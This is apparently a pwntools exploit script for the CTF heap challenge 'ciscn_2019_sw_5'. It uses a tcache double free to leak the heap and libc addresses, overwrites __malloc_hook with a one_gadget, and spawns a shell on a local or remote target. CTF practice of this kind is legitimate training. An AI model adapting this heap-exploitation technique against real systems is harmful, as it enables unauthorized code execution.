import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_sw_5')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_sw_5')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',27953)
			elf=ELF('./ciscn_2019_sw_5')
			libc=ELF('../../x64libc/libc.so.6')
			#ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a,b):
			io.sendlineafter('>> ','1')
			io.sendafter('title:',a)
			io.sendafter('content:',b)

		def delete(a):
			io.sendlineafter('>> ','2')
			io.sendlineafter('index:',str(a))


		add('keer','wk5211314')
		delete(0)
		delete(0)
		add('\x80','wk')
		data=io.recvuntil(' wk')
		heap_base=u64(data[1:7]+'\x00\x00')-0x280
		add(p64(heap_base+0x20),p64(heap_base+0x20)*9)
		add(p64(heap_base+0x20),p64(heap_base+0x20)*9)
		add('/bin/sh\x00','\x07'*0x8+'\x00'*0x38+p64(0x251-0x60)+'\x00'*0x10+p64(heap_base+0x70))
		add(p64(0),p64(0)+p64(heap_base+0x70))
		delete(5)
		add('\x01',p64(0)+p64(heap_base+0x70))
		libc_base=u64(io.recvuntil(' ')[1:7]+'\x00\x00')-((libc.sym['__malloc_hook']>>8)<<8)-0x1
		libc.address=libc_base
		add('\x01',p64(0)+p64(libc.sym['__malloc_hook']))
		add(p64(libc_base+one_gadget[1]),p64(0))
		io.sendlineafter('>> ','1')


		success('libc_base:'+hex(libc_base))
		success('heap_base:'+hex(heap_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue